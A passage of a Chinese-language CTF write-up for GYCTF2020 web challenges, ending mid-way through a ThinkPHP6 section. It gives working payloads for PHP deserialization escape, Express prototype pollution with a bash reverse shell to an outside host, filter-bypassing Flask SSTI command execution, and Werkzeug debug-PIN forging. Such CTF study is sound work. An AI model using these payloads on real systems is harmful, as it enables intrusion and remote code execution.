<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">&quot;UpdateHelper&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;sql&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;select 1,&quot;</span>c4ca4238a0b923820dcc509a6f75849<span class="string">b&quot; from user where username=?&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;dbCtrl&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>下面我们就需要思考如何将脚本得到的序列化串被程序反序列化呢？</p>
<p>先找一下反序列化的利用点，从 update.php 可以跟进到<code>User</code>类的<code>update()</code>函数:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$Info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getNewinfo</span>());  </span><br><span class="line">	<span class="variable">$age</span> = <span class="variable">$Info</span>-&gt;age;</span><br><span class="line">	<span class="variable">$nickname</span> = <span class="variable">$Info</span>-&gt;nickname; </span><br><span class="line">	<span class="variable">$updateAction</span> = <span class="keyword">new</span> <span class="title class_">UpdateHelper</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>], <span class="variable">$Info</span>, <span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到反序列化的是<code>getNewinfo()</code>函数的返回值，跟进这个函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$age</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">safe</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Info</span>(<span class="variable">$age</span>, <span class="variable">$nickname</span>)));  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的返回值是一个<strong>先序列化</strong>再经过<code>safe()</code>函数处理的<code>Info</code>类对象。</p>
<p>所以最终能够反序列化的不是我们直接传入的字符串，而是用我们传入的值实例化一个<code>Info</code>类的对象，然后对这个对象进行序列化，载对这个序列化结果进行<code>safe()</code> 处理，最后得到的值再进行反序列化。</p>
<p><code>safe()</code>函数如下，如果你了解<strong>反序列化的字符逃逸原理</strong>，那么很容易看出这个函数的问题：将长度小于6的字符串直接替换成了长度为6的hacker。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$array</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们将刚才得到的payload直接用age或nickname参数传入的化，其实际上只会被当成<code>Info</code>类里的一个很长的字符串，并不能被反序列化得到执行。</p>
<p>所以要想反序列化我们的payload，就得控制<code>Info</code>类对象的序列化串，看一下这个序列化串的格式（假设age为20，nickname为lethe）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:5:&quot;lethe&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>我感觉这里原理上有点类似注入，需要闭合构造符合规则的序列化串。</p>
<p>假设我们要通过nickname参数来注入，先看一下我们构造的payload2如下（未逃逸字符串前）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>Use<span class="string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;s:70:&quot;</span>select <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="keyword">from</span> user where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>可以看到我们在而已序列化串前加上了<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>，在最后加上了一个<code>&#125;</code>（整个长度为263），这样我们将其作为<code>new Info($age,$nickname)</code>的nickname传入时，序列化的结果如下：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200225135058986.png" alt="在这里插入图片描述"><br>上图中两个箭头之间的内容就是我们传入的payload，可以看到我们在第一个箭头那里是想闭合双引号，从而使后面的内容符合序列化的规则的。但是我圈出来的那个263在序列化的规则里，限制了nickname的长度为263，所以后面长度为263的payload还是当作了一个普通字符串，而不是序列化里的内容。</p>
<p>这时候就需要用到字符逃逸的原理了，我们在payload2的前面加上263个<code>union</code>，这样我上面圈出来的值就变成了$263×5+263&#x3D;1578$，上面第一个箭头所指的双引号里是263个<code>union</code>(长度为$263×5&#x3D;1315$)，当对这个序列化串进行<code>safe()</code>函数的处理时，所有的<code>union</code>都被替换成了<code>hacker</code>，也就是双引号里的内容变成了263个<code>hacker</code>（长度为$263×6&#x3D;1578$），正好等于前面的1579，如下：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200225140946410.png" alt="在这里插入图片描述"></p>
<p>上面的图可以看出来经过safe()函数处理后，这个序列化串就被解释成了nickname变量长度为1586的重复<code>hacker</code>字符串，而我们的而已序列化payload，则以对象的形式作为CtrCase变量的值。<br>而之所前面构造的时候在最后面加一个<code>&#125;</code>，是因为<code>Info</code>类的对象只有3个变量（第一个箭头所指），当到我们第二个箭头所指的位置时，前面已经有3个变量满足了序列化串的要求了，所以加一个<code>&#125;</code>来闭合整个序列化串。这样由于前面的内容已经符合反序列化的规则，所以后面的内容都将被忽略。</p>
<p>最终payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age=<span class="number">1</span>&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>Use<span class="string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;s:70:&quot;</span>select <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="keyword">from</span> user where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>在update.php以POST传入上面的payload，此时反序列化被执行，在login函数里面已经成功验证了，token被设置为了<code>admin</code>，所以再回到登录界面使用任意密码即可登录admin账户：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200225013210183.png" alt="在这里插入图片描述"><br><br></p>
<h1 id="Ez-Expresss"><a href="#Ez-Expresss" class="headerlink" title="Ez_Expresss"></a>Ez_Expresss</h1><p>存在<a target="_blank" rel="noopener" href="http://www.zip源码泄露,可以下载得到源码./">www.zip源码泄露，可以下载得到源码。</a></p>
<p>在登录界面，有如下提示：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200305234711800.png"><br>这里只支持大写非常的奇怪，查阅资料得到：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200305234811798.png" alt="在这里插入图片描述"><br>再查看源码，确实是使用了toUpperCase()进行处理，所以可以利用这个特性来注册<code>admın</code>用户进行绕过：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306000532187.png" alt="在这里插入图片描述"></p>
<p>可以看到成功了，并且提示flag在&#x2F;flag目录下。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306000712785.png" alt="在这里插入图片描述"></p>
<p>下面就考虑如何读文件或者RCE，再次进行代码审计。</p>
<p>一开始就是熟悉的merge+clone，那么考虑是否存在原型链污染（不熟悉的话可参考p神的：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击</a>）<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200305235757818.png" alt="在这里插入图片描述"><br>在<code>/action</code>路由下使用了<code>clone()</code>方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这个路由只有ADMIN可以访问，且<code>clone()</code>的参数是我们可控的，所以可以确定原型链污染了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306001937535.png" alt="在这里插入图片描述"><br>然后在info路由看到了一个莫名其妙又有点眼熟的<code>outputFunctionName</code>，在XNUCA 2019的HardJS考过这个，拼接在ejs渲染引擎中可以RCE，可参考我当时<a href="https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019%E9%83%A8%E5%88%86web%E9%A2%98%E5%A4%8D%E7%8E%B0/#xnuca-2019-hardjs-1">对HardJS的分析文章。</a></p>
<p>所以可以直接改一下当时的payload就好：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;a=1;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xxx/7777 0&gt;&amp;1\&quot;&#x27;)//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-7%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E6%9B%B4%E5%A5%BD%E4%B8%80%E7%82%B9%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84payload%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9C%89%E6%97%B6%E5%80%99%E7%94%A8require%E4%BC%9A%E6%8A%A5%E9%94%99%EF%BC%9A">https://xz.aliyun.com/t/7184#toc-7推荐一个更好一点的命令执行的payload，因为有时候用require会报错：</a></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;a=1;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xxx/7777 0&gt;&amp;1\&quot;&#x27;)//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后提交<code>/action</code>（即最喜欢的语言）并抓包，然后填入poayload，注意要把Content-Type: 改为plication&#x2F;json：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306004459451.png" alt="在这里插入图片描述"><br>然后访问<code>/info</code>路由让<code>outputFunctionName</code>拼接到渲染引擎中触发原型链污染，即可得到shell：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306004728516.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="FlaskApp"><a href="#FlaskApp" class="headerlink" title="FlaskApp"></a>FlaskApp</h1><p>进入页面后，是一个Flask写的base64加解密功能，提示路由的源码中提示了<code>PIN</code>，应该是想说Flask的Debug模式中的PIN码。</p>
<p>在Base64解码的功能中很容易使其报错（如输入1）：<img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306170505781.png" alt="在这里插入图片描述"><br>可以看到确实开启了Debug模式，并泄露了decode路由的源码:<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306170602388.png" alt="在这里插入图片描述"><br>解码的结果直接拼接到模板中渲染，存在SSTI漏洞，不过经过了<code>waf</code>的处理，我们也并不知道过滤了什么东西。</p>
<p>那么先试试一下SSTI吧：<br><code>&#123;&#123;2+2&#125;&#125;</code>的base64为<code>e3syKzJ9fQ==</code>，我们进行解码得到4，确认存在SSTI了：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306170927846.png" alt="在这里插入图片描述"></p>
<h4 id="非预期解：利用SSTI进行RCE"><a href="#非预期解：利用SSTI进行RCE" class="headerlink" title="非预期解：利用SSTI进行RCE"></a>非预期解：利用SSTI进行RCE</h4><p>虽然知道出题人的意思是利用PIN码来RCE，不过我还是想试试看能否直接利用SSTI进行RCE。</p>
<p>那么先试试过滤了哪些？</p>
<p>经过测试，SSTI中常用的一些关键词并没有被过滤(毕竟预期解也需要SSTI来读文件~)：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306171543736.png" alt="在这里插入图片描述"><br>而是过滤了<code>system</code>、<code>popen</code>、<code>os</code>、<code>eval</code>、<code>import</code>、<code>flag</code>等RCE需要用到的关键词，但是这个过滤可以使用<strong>拼接字符串</strong>来绕过，这样我们想构造一个payload绕过就并不是很难了：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306172027467.png" alt="在这里插入图片描述"></p>
<p>所以我们要构造的payload一定不是能是<code>xx.popen()</code>的形式，而是要把被过滤的关键词用字符串的方式调用，这样才能利用拼接或者编码来绕过，实际上这样的payload也很常见，网上能搜到很多。并且本题环境中可以用的类也不少，如下面两个payload均可以RCE：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">131</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>](<span class="string">&#x27;__im&#x27;</span>+<span class="string">&#x27;port__(&quot;o&#x27;</span>+<span class="string">&#x27;s&quot;).po&#x27;</span>+<span class="string">&#x27;pen(&quot;cat /this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&quot;)&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cat /this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>将payload进行base64编码，再在题目中解码触发SSTI进行RCE：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306172255728.png" alt="在这里插入图片描述"></p>
<h4 id="预期解：利用PIN码进行RCE"><a href="#预期解：利用PIN码进行RCE" class="headerlink" title="预期解：利用PIN码进行RCE"></a>预期解：利用PIN码进行RCE</h4><p>参考这篇文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197602">https://www.anquanke.com/post/id/197602</a></p>
<p>要想生成PIN码，我们需要获得下面几个信息，这里就不考虑RCE了，所需要的信息均可以通过读文件来获得：</p>
<p>（1）服务器运行flask所登录的用户名。通过读取&#x2F;etc&#x2F;password可知此值为：<code>flaskweb</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306182207863.png" alt="在这里插入图片描述"><br>（2）modname的值。一般不变就是<code>flask.app</code></p>
<p>（3） <code>getattr(app, &quot;__name__&quot;, app.__class__.__name__) </code>的结果。就是<code>Flask</code>，也不会变</p>
<p>（4）flask库下app.py的绝对路径。在报错信息中可以获取此值为： <code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306182459368.png" alt="在这里插入图片描述"><br>（5）当前网络的mac地址的十进制数。通过文件<code>/sys/class/net/eth0/address</code>读取，eth0为当前使用的网卡：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306182704459.png" alt="在这里插入图片描述"><br>将<code>0242ae00ecc2</code>转换为10进制为：<code>2485410393282</code></p>
<p>（6）机器的id。</p>
<ul>
<li>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_i</code>，有的系统没有这两个文件。</li>
<li>对于docker机则读取<code>/proc/self/cgroup</code>，其中第一行的<code>/docker/</code>字符串后面的内容作为机器的id，如下为<code>1834da85a17efb2029d4a9c8e8f71fe40a96862055c636788c9835665e8e3359</code></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306183250928.png" alt="在这里插入图片描述"></p>
<p>然后用kingkk师傅的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485410393282&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;1834da85a17efb2029d4a9c8e8f71fe40a96862055c636788c9835665e8e3359&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>得到PIN码：<code>119-747-372</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200306184649989.png" alt="在这里插入图片描述"></p>
<p>输入PIN后就可以在python终端任意执行代码了：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/202003061846353.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="EasyThinking"><a href="#EasyThinking" class="headerlink" title="EasyThinking"></a>EasyThinking</h1><p>这一题利用的是ThinkPHP6.0任意文件创建漏洞，分析可以参考这篇文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197261">ThinkPHP6.0任意文件创建分析</a></p>
<p>简单说就是这个漏洞可以通过session来任意创建文件（文件名可控），并且当session里的数据可控的话，我们就可以控制创建的文件的内容，从而getshell。</p>
<p>扫描发现&#x2F;<a href="http://www.zip下载源码，除了注册和登录外还有一个搜索功能，通过源码可以看到我们搜索的值会被写入session中，因此利用我们就可以利用这个漏洞任意创建内容可控的文件：">www.zip下载源码，除了注册和登录外还有一个搜索功能，通过源码可以看到我们搜索的值会被写入session中，因此利用我们就可以利用这个漏洞任意创建内容可控的文件：</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200315115458626.png" alt="在这里插入图片描述"></p>
<p>首先注册一个用户，并在登陆的时候将PHPSESSID的值改为长度为32的php文件名，如<code>1111111111111111111111111111.php</code>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200315120241769.png" alt="在这里插入图片描述"></p>
<p>然后在搜索功能中输入文件的内容：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200315120711196.png" alt="在这里插入图片描述"></p>
<p>Thinkphp6默认把session文件存在&#x2F;runtime&#x2F;session目录下面，并保存为sess_xxx的形式：</p>
